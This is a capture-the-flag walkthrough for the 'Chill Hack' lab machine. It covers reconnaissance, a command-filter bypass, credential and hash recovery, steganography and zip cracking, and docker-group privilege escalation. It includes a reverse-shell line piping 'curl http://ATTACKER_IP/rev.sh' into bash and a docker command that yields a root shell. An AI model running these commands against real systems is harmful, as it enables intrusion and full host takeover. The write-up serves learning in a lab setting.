# Chill Hack

### Investigate!
Initial scan shows port 21,22 and 80 open: 

Nmap scan report for 10.10.234.14
Host is up (0.058s latency).                                                 
                                                                             
    PORT   STATE SERVICE VERSION                                                 
    21/tcp open  ftp     vsftpd 3.0.3                                            
    | ftp-syst:                                                                  
    |   STAT:                                                                    
    | FTP server status:                                                         
    |      Connected to ::ffff:10.14.90.188                                      
    |      Logged in as ftp                                                      
    |      TYPE: ASCII                                                           
    |      No session bandwidth limit                                            
    |      Session timeout in seconds is 300                                     
    |      Control connection is plain text                                      
    |      Data connections will be plain text                                   
    |      At session startup, client count was 2                                
    |      vsFTPd 3.0.3 - secure, fast, stable                                   
    |_End of status                                                              
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)                       
    |_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt           
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                         
    | ssh-hostkey:                                                               
    |   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)               
    |   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
    |_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-title: Game Info
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

The ftp server contains the following note:<br />
![image](https://github.com/user-attachments/assets/4f8fa8bc-bcf5-4fd1-822a-9d3d8dd156ff)<br />
Directory enumeration reveals a `/secret` directory:<br />
![image](https://github.com/user-attachments/assets/822e6da3-2aa7-4d16-88a5-2b4946036515)<br />
There's a filter that won't allow me to run commands such as `ls` or `nc`. However I found a way to spawn a reverse shell. The `curl` command is not filtered. So create a `rev.sh` containing the code for a reverse shell, then open a netcat listener (I used port 4444),
and then run the command `curl http://ATTACKER_IP/rev.sh|bash`<br />
![image](https://github.com/user-attachments/assets/f4227d70-02b3-4338-8e8d-fe8d3afef683)<br />
Inside `/var/www/files/index.php`, I found a set of credentials:<br />
![image](https://github.com/user-attachments/assets/bbe00638-77db-4130-8cd1-22e48b59e7a6)<br />
root:!@m+her00+@db<br />
There are two hashes inside this database:<br />
![image](https://github.com/user-attachments/assets/a238661c-35c4-4d51-90f1-a43706357704)<br />
These passwords are respectively:<br />
`masterpassword`<br />
`dontaskdonttell`<br />
For now these passwords don't seem to be useful. I then found another local web server on port 9001, hosted in `/var/www/files` and found a hint inside `/var/www/files/hacker.php`:<br />
![image](https://github.com/user-attachments/assets/2e4dfbf7-70ee-4017-8f5d-883fb86204fc)<br />
So I thought that maybe some hidden information might be inside one of these two files inside `/images/`:<br />
![image](https://github.com/user-attachments/assets/a48a280d-0120-4f19-878f-68f9f7a0a0cb)<br />
So I transfered the hacker image to my kali machine using netcat, and called it `hacker.jpg`. Then I downloaded [this tool](https://www.kali.org/tools/steghide/) to extract information embedded inside images.<br />
![image](https://github.com/user-attachments/assets/5314d775-fe76-49a4-be0e-02359554a817)<br />
Providing an empty passphrase was enough to extract a `backup.zip` file. However this zip file is encrypted:<br />
![image](https://github.com/user-attachments/assets/cc198342-05dd-4e07-b0a3-11b5ac097d32)<br />
To try and crack it, I use john:<br />
![image](https://github.com/user-attachments/assets/d6471bf0-11eb-41d1-8531-521a8ba382aa)<br />
So I unzipped the file and got a file called `source_code.php`. It contains a base64 encoded password:<br />
![image](https://github.com/user-attachments/assets/6fed5429-1360-42a0-8b46-b74e29c1149b)<br />
The decoded password is `!d0ntKn0wmYp@ssw0rd`. <br />
With this password, I was able to log into `anurodh`'s account using ssh. <br />
Linpeas gives me this output:<br />
![image](https://github.com/user-attachments/assets/fd331ba9-fcba-4e1e-b09c-1482d36182a2)<br />
This means that anurodh is part of the `docker` group. The docker group can obtain root privileges on the machine. This is because the daemon `dockerd` requires root privileges to execute. The docker user(and group) can execute the `docker` command, which can be used to run containers that can access the entire file system. <br />
To exploit this, run `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`. This will spawn a shell as root.
![image](https://github.com/user-attachments/assets/e8da73d7-65a1-4540-8c26-942a54763a2f)<br />
I asked chatGPT to generate a command to exploit this,but let's break down this command:<br />
- `docker run`: It creates a temporary environment using an image (in this case, alpine). Alpine is a minimal Linux distribution that is very lightweight
- `-v /:/mnt`: This mounts the entire root filesystem of the host (/) into the container at /mnt
- `--rm`: This flag ensures that the container is automatically removed after it stops.
- `-it`: -i: Keeps the container's standard input open so you can interact with it. -t: Allocates a pseudo-terminal for the container, making it behave like an interactive shell.
- `alpine`: This specifies the Docker image to use.
- `chroot /mnt sh`: This is the command executed inside the container. `chroot`: Changes the apparent root directory (/) for the container to the directory `/mnt`.
Since `/mnt` is mounted to the host's root filesystem, this effectively means the container's root environment now "becomes" the host's filesystem.
`sh`: Starts a shell session within the new root environment.<br />
